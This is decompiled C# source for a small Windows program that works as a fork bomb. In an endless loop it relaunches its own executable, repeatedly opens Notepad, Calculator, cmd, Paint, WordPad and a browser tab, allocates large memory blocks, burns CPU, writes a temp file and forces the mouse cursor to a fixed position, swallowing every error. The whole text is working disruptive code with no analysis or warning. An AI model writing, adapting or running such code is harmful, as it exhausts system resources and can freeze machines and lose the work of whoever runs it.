// Decompiled with JetBrains decompiler
// Type: ConsoleApp1.Program
// Assembly: ConsoleApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C812A9DE-DFEF-45FE-9614-90A2B56FA8E6

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

#nullable disable
namespace ConsoleApp1;

internal class Program
{
  [DllImport("user32.dll")]
  private static extern bool SetCursorPos(int X, int Y);

  private static void Main(string[] args)
  {
    string location = Assembly.GetExecutingAssembly().Location;
    string fileName = "https://www.google.co.uk/";
    while (true)
    {
      try
      {
        Process.Start(location);
      }
      catch
      {
      }
      try
      {
        Process.Start("Notepad.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start("calc.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start("cmd.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start(new ProcessStartInfo(fileName)
        {
          UseShellExecute = true
        });
      }
      catch
      {
      }
      try
      {
        Process.Start("mspaint.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start("write.exe");
      }
      catch
      {
      }
      try
      {
        byte[] numArray = new byte[100000000];
      }
      catch
      {
      }
      try
      {
        for (int d = 0; d < 1000000; ++d)
          Math.Sqrt((double) d);
      }
      catch
      {
      }
      try
      {
        File.WriteAllText("tempfile.txt", "This is a test.");
      }
      catch
      {
      }
      try
      {
        Program.SetCursorPos(500, 300);
      }
      catch
      {
      }
    }
  }
}
